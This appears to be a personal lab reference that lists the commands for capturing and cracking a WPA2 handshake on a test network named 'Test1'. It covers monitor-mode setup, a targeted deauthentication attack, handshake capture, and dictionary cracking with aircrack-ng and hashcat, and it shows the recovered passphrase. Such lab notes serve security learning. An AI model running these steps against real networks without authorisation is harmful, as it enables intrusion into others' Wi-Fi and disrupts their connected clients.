# WPA2-Handshake-Capture-Cracking-Lab-
====================================================================
WPA2 Handshake Capture & Cracking Lab — Command Reference
Ibrahim Khalid
====================================================================

--------------------------------------------------------------------
1. DRIVER INSTALL (RTL8812AU / Alfa AWUS036ACH)
--------------------------------------------------------------------
git clone https://github.com/aircrack-ng/rtl8812au.git
cd rtl8812au
sudo make dkms-install

# reboot VM after install, then reconnect adapter


--------------------------------------------------------------------
2. INTERFACE SETUP — MONITOR MODE
--------------------------------------------------------------------
sudo airmon-ng check kill
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# verify
iwconfig wlan0
ip link
lsusb


--------------------------------------------------------------------
3. TARGET DISCOVERY
--------------------------------------------------------------------
sudo airodump-ng wlan0

# target identified:
#   ESSID : Test1
#   BSSID : D8:07:B6:E1:55:C0
#   CH    : 9


--------------------------------------------------------------------
4. SCOPED HANDSHAKE CAPTURE
--------------------------------------------------------------------
sudo airodump-ng --bssid D8:07:B6:E1:55:C0 -c 9 -w test1_capture wlan0


--------------------------------------------------------------------
5. FORCE HANDSHAKE VIA TARGETED DEAUTH
--------------------------------------------------------------------
sudo aireplay-ng --deauth 5 -a D8:07:B6:E1:55:C0 -c 1A:2A:09:2B:9F:4D wlan0


--------------------------------------------------------------------
6. VERIFY HANDSHAKE CAPTURED
--------------------------------------------------------------------
aircrack-ng test1_capture-01.cap

# Output confirmed:
#   1  D8:07:B6:E1:55:C0  Test1  WPA (1 handshake)


--------------------------------------------------------------------
7. CONVERT TO HASHCAT FORMAT (22000)
--------------------------------------------------------------------
hcxpcapngtool -o test1.hc22000 test1_capture-01.cap

# Result: EAPOL pairs written to 22000 hash file: 1 (RC checked)


--------------------------------------------------------------------
8. OFFLINE DICTIONARY ATTACK — aircrack-ng
--------------------------------------------------------------------
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b D8:07:B6:E1:55:C0 test1_capture-01.cap

# KEY FOUND! [ 1q2w3e4r5t6y7u8i9o0p ]


--------------------------------------------------------------------
9. OFFLINE DICTIONARY ATTACK — hashcat
--------------------------------------------------------------------
hashcat -m 22000 test1.hc22000 /usr/share/wordlists/rockyou.txt

# Recovered password:
# 88e81d72239ed55714f65506b2894c0c:d807b6e155c0:1a2a092b9f4d:Test1:1q2w3e4r5t6y7u8i9o0p

# Retrieve result again anytime without re-running:
hashcat -m 22000 test1.hc22000 --show


--------------------------------------------------------------------
10. USEFUL EXTRAS
--------------------------------------------------------------------
# check wordlist size
wc -l /usr/share/wordlists/rockyou.txt

# disable power management if captures are flaky
sudo iw dev wlan0 set power_save off

# PMKID capture (no connected client required) — alternative to steps 4-5
sudo hcxdumptool -i wlan0 -o test1.pcapng --enable_status=1

====================================================================
END
====================================================================
